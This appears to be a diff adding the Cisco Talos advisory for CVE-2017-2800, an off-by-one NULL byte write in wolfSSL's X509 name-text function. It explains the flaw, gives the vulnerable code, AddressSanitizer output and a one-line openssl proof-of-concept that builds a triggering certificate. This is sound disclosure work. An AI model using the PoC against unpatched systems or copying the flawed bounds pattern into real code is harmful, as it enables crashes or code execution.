@@ -1,0 +1,141 @@
+TALOS-2017-0293
+WOLFSSL LIBRARY X509 CERTIFICATE TEXT PARSING CODE EXECUTION VULNERABILITY
+MAY 8, 2017
+CVE-2017-2800
+
+SUMMARY
+An exploitable off-by-one write vulnerability exists in the x509 certificate parsing functionality of wolfSSL library versions up to 3.10.2. A specially crafted x509 certificate can cause a single out of bounds byte overwrite resulting in potential certificate validation vulnerabilities, denial of service and possible remote code execution. In order to trigger this vulnerability, the attacker needs to supply a malicious x509 certificate to either server or client application using this library.
+
+TESTED VERSIONS
+WolfSSL 3.10.2
+
+PRODUCT URLS
+https://www.wolfssl.com
+
+CVSSV3 SCORE
+8.1 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+CWE
+CWE-193: Off-by-one Error
+
+DETAILS
+WolfSSL, previously CyaSSL, is a lightweight SSL/TLS library targeted for embedded and RTOS environments, primarily because of its small size, speed, portability, and feature set. According to the vendor it is used in wide range of products including industrial control systems, IoT devices, VoIP hardware, routers and more.
+
+The vulnerability exists in x509 code that deals with string fields in DER certificates. Specifically, when parsing commonName, countryName, localityName, stateName, orgName or orgUnit fields, the function wolfSSL_X509_NAME_get_text_by_NID is used. Its prototype is:
+
+int wolfSSL_X509_NAME_get_text_by_NID(WOLFSSL_X509_NAME* name, int nid, char* buf, int len);
+
+Its task is to copy the appropriate string from name context into supplied buf of length len. The issue happens when the string is longer or equal to length of the allocated buffer. 
+Following code highlights the issue for the case of commonName field:
+
+
+		int wolfSSL_X509_NAME_get_text_by_NID(WOLFSSL_X509_NAME* name,
+																			int nid, char* buf, int len)
+{
+		char *text = NULL;
+		int textSz = 0;
+
+
+		WOLFSSL_ENTER("wolfSSL_X509_NAME_get_text_by_NID");
+
+
+		switch (nid) {
+				case ASN_COMMON_NAME:
+						text = name->fullName.fullName + name->fullName.cnIdx;        [1]
+						textSz = name->fullName.cnLen;                                [2]
+						break;
+...
+
+
+				if (buf != NULL && text != NULL) {
+				textSz = min(textSz, len);                                        [3]
+				XMEMCPY(buf, text, textSz);                                        [4]
+				buf[textSz] = '\0';                                                [5]
+		}
+
+
+At [1] and [2], text and textSz are initialized. At [3] the lesser of the two values textSz and len is chosen. This value ends up as the size parameter to a memcpy call at [4]. Then, the same value is used as an index to NULL terminate the string at [5]. If the string length is bigger than size of the allocated buffer, NULL termination at index textSz will cause an off-by-one NULL byte write into adjacent memory variable on the stack or heap, depending on where the buffer was allocated.
+
+Depending on the way the library is used, this could lead to further issues when doing certificate validation or potentially result in remote code execution.
+The vulnerability can be triggered by supplying the attached PoC x509 certificate to the certfileds example app from wolfssl-examples.
+
+CRASH INFORMATION
+Address sanitizer output:
+
+==97602==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffe1a0 at pc 0x7ffff7b73f56 bp 0x7fffffff8410 sp 0x7fffffff8408
+WRITE of size 1 at 0x7fffffffe1a0 thread T0
+		#0 0x7ffff7b73f55 in wolfSSL_X509_NAME_get_text_by_NID wolfssl/src/ssl.c:12458
+		#1 0x7ffff7b73f55 in ?? ??:0
+		#2 0x4ea99d in main wolfssl/wolfssl-examples/certfields/main.c:128
+		#3 0x4ea99d in ?? ??:0
+		#4 0x7ffff6afe82f in __libc_start_main /build/glibc-Qz8a69/glibc-2.23/csu/../csu/libc-start.c:291
+		#5 0x7ffff6afe82f in ?? ??:0
+		#6 0x418c48 in _start ??:?
+		#7 0x418c48 in ?? ??:0
+
+
+Address 0x7fffffffe1a0 is located in stack of thread T0 at offset 23872 in frame
+		#0 0x4ea2af in main wolfssl/wolfssl-examples/certfields/main.c:44
+		#1 0x4ea2af in ?? ??:0
+
+
+	This frame has 10 object(s):
+		[32, 14128) 'derCert'
+		[14384, 14388) 'idx'
+		[14400, 23280) 'pubKey'
+		[23536, 23544) 'cert'
+		[23568, 23648) 'commonName'
+		[23680, 23760) 'countryName'
+		[23792, 23872) 'localityName' <== Memory access at offset 23872 overflows this variable
+		[23904, 23984) 'stateName'
+		[24016, 24096) 'orgName'
+		[24128, 24208) 'orgUnit'
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+			(longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/lib/libwolfssl.so.3+0x184f55)
+Shadow bytes around the buggy address:
+	0x10007fff7be0: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2
+	0x10007fff7bf0: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
+	0x10007fff7c00: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 00 f2 f2 f2 00 00
+	0x10007fff7c10: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00
+	0x10007fff7c20: 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00
+=>0x10007fff7c30: 00 00 00 00[f2]f2 f2 f2 00 00 00 00 00 00 00 00
+	0x10007fff7c40: 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+	0x10007fff7c50: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 f3 f3
+	0x10007fff7c60: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00
+	0x10007fff7c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	0x10007fff7c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+	Addressable:           00
+	Partially addressable: 01 02 03 04 05 06 07
+	Heap left redzone:       fa
+	Heap right redzone:      fb
+	Freed heap region:       fd
+	Stack left redzone:      f1
+	Stack mid redzone:       f2
+	Stack right redzone:     f3
+	Stack partial redzone:   f4
+	Stack after return:      f5
+	Stack use after scope:   f8
+	Global redzone:          f9
+	Global init order:       f6
+	Poisoned by user:        f7
+	Container overflow:      fc
+	Array cookie:            ac
+	Intra object redzone:    bb
+	ASan internal:           fe
+	Left alloca redzone:     ca
+	Right alloca redzone:    cb
+==97602==ABORTING
+
+EXPLOIT PROOF-OF-CONCEPT
+A certificate that triggers this vulnerability can be generated using the following openssl command:
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert1.pem -days 365 -subj "/C=US/ST=Maryland/L=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/O=E/CN=A"
+
+CREDIT
+Discovered by Aleksandar Nikolic of Cisco Talos.
+
+TIMELINE
+2017-03-14 - Vendor Disclosure
+2017-05-04 - Public Release
